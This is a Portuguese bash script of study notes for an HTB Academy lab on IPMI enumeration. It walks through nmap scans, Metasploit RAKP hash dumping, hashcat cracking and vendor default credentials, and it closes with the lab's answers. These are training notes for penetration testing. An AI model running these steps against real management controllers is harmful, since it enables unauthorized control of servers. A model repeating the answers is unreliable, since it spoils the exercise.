#!/bin/bash

################################################################################
# HTB ACADEMY - FOOTPRINTING - IPMI
#
# OBJETIVO DA AULA
# ----------------
# Aprender a identificar servidores que possuem um BMC (Baseboard Management
# Controller) utilizando o protocolo IPMI, enumerar suas características,
# capturar hashes de autenticação RAKP, quebrar esses hashes offline e obter
# acesso administrativo ao gerenciamento remoto do servidor.
#
# CONCEITOS IMPORTANTES
# ---------------------
# • IPMI = Intelligent Platform Management Interface
# • BMC  = Baseboard Management Controller
# • Funciona independentemente do Linux ou Windows
# • Continua funcionando mesmo com o servidor desligado
# • Permite:
#     - Ligar/desligar servidor
#     - Reiniciar servidor
#     - Alterar BIOS
#     - Instalar sistema operacional remotamente
#     - Abrir console remoto
#     - Monitorar hardware
#
# FABRICANTES MAIS COMUNS
# -----------------------
# Dell        -> iDRAC
# HP          -> iLO
# Supermicro  -> IPMI
# Lenovo      -> XClarity
#
# PORTA PADRÃO
# ------------
# UDP 623
#
# SERVIÇO IDENTIFICADO PELO NMAP
# ------------------------------
# asf-rmcp
#
# FLUXO DA ENUMERAÇÃO
# -------------------
#
# Encontrar porta UDP 623
#          ↓
# Confirmar IPMI
#          ↓
# Descobrir versão do protocolo
#          ↓
# Descobrir fabricante
#          ↓
# Procurar interface Web / SSH / Telnet
#          ↓
# Testar credenciais padrão
#          ↓
# Capturar hash RAKP
#          ↓
# Quebrar hash offline
#          ↓
# Obter usuário e senha
#          ↓
# Avaliar reutilização de credenciais
#
################################################################################


###########################################
# Definir alvo
###########################################

export TARGET=10.129.X.X

echo "$TARGET"


###########################################
# Verificar conectividade (opcional)
###########################################

ping -c 4 "$TARGET"


###########################################
# Scan UDP simples para verificar IPMI
###########################################

sudo nmap -Pn -sU -p623 "$TARGET"


###########################################
# Descobrir versão do IPMI utilizando NSE
###########################################

sudo nmap \
-Pn \
-sU \
-p623 \
--script ipmi-version \
"$TARGET"


###########################################
# Scan mais completo
###########################################

sudo nmap \
-Pn \
-sU \
-sV \
-p623 \
--script ipmi-version \
"$TARGET"


###########################################
# Salvar resultados
###########################################

sudo nmap \
-Pn \
-sU \
-sV \
-p623 \
--script ipmi-version \
-oA ipmi_scan \
"$TARGET"


###########################################
# Procurar interfaces Web do BMC
###########################################

sudo nmap -Pn -sV -p80,443 "$TARGET"


###########################################
# Procurar SSH
###########################################

sudo nmap -Pn -sV -p22 "$TARGET"


###########################################
# Procurar Telnet
###########################################

sudo nmap -Pn -sV -p23 "$TARGET"


###########################################
# Scan TCP + UDP
###########################################

sudo nmap \
-Pn \
-sS \
-sU \
-p22,23,80,443,623 \
-sV \
"$TARGET"


###########################################
# Verificar scripts IPMI disponíveis
###########################################

ls /usr/share/nmap/scripts | grep ipmi


###########################################
# Testar Cipher Zero (opcional)
###########################################

sudo nmap \
-Pn \
-sU \
-p623 \
--script ipmi-cipher-zero \
"$TARGET"


################################################################################
# METASPLOIT
################################################################################

msfconsole


###########################################
# Procurar módulos IPMI
###########################################

search ipmi


###########################################
# Descobrir versão do IPMI
###########################################

use auxiliary/scanner/ipmi/ipmi_version

set RHOSTS "$TARGET"

show options

run


###########################################
# Capturar hashes RAKP
###########################################

use auxiliary/scanner/ipmi/ipmi_dumphashes

set RHOSTS "$TARGET"

show options

run


###########################################
# Testar automaticamente senhas comuns
###########################################

set CRACK_COMMON true

run


###########################################
# Salvar hash para Hashcat
###########################################

set OUTPUT_HASHCAT_FILE /tmp/ipmi_hash.txt

run


###########################################
# Salvar hash para John The Ripper
###########################################

set OUTPUT_JOHN_FILE /tmp/ipmi_john.txt

run


###########################################
# Visualizar wordlist de usuários
###########################################

cat /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt


###########################################
# Visualizar wordlist de senhas
###########################################

cat /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt


################################################################################
# HASHCAT
################################################################################

###########################################
# Verificar RockYou
###########################################

ls -lh /usr/share/wordlists/rockyou*


###########################################
# Extrair RockYou
###########################################

sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz


###########################################
# Criar arquivo contendo hash capturado
###########################################

nano ipmi_hash.txt


###########################################
# Quebrar hash IPMI
#
# 7300 = IPMI2 RAKP HMAC-SHA1
#
# --username é obrigatório porque o hash
# começa com "usuario:"
###########################################

hashcat \
--username \
-m 7300 \
-a 0 \
ipmi_hash.txt \
/usr/share/wordlists/rockyou.txt


###########################################
# Mostrar senha encontrada
###########################################

hashcat \
--username \
-m 7300 \
ipmi_hash.txt \
--show


###########################################
# Caso queira usar apenas wordlist IPMI
###########################################

hashcat \
--username \
-m 7300 \
-a 0 \
ipmi_hash.txt \
/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt


################################################################################
# IPMITOOL (caso possua credenciais)
################################################################################

ipmitool \
-I lanplus \
-H "$TARGET" \
-U admin \
chassis status


################################################################################
# CREDENCIAIS PADRÃO IMPORTANTES
################################################################################

# Dell
# root : calvin

# Supermicro
# ADMIN : ADMIN

# HP iLO
# Administrator : senha aleatória de fábrica


################################################################################
# RESPOSTAS DO LABORATÓRIO
################################################################################

# Question 1
# ----------
# Capturar hash com ipmi_dumphashes
#
# Exemplo:
#
# Hash found:
# admin:HASH:HMAC
#
# Username:
#
# admin


# Question 2
# ----------
# Salvar hash
#
# Executar Hashcat
#
# hashcat --username -m7300 ...
#
# Resultado:
#
# admin:HASH:HMAC:trinity
#
# Password:
#
# trinity


################################################################################
# O QUE DECORAR PARA PROVAS E PENTESTS
################################################################################

# IPMI = Intelligent Platform Management Interface
#
# BMC = Baseboard Management Controller
#
# Porta padrão = UDP 623
#
# Serviço = asf-rmcp
#
# Script Nmap = ipmi-version
#
# Scanner Metasploit =
# auxiliary/scanner/ipmi/ipmi_version
#
# Captura Hash =
# auxiliary/scanner/ipmi/ipmi_dumphashes
#
# Hashcat Mode = 7300
#
# Ataque = Offline Password Cracking
#
# Credenciais padrão comuns:
#
# root:calvin
# ADMIN:ADMIN
#
# Risco:
#
# Controle praticamente físico do servidor.
#
# Reutilização de senhas.
#
# Alteração de BIOS.
#
# Instalação remota do sistema operacional.
#
# Console remoto.
#
# Reinicialização do servidor.
#
################################################################################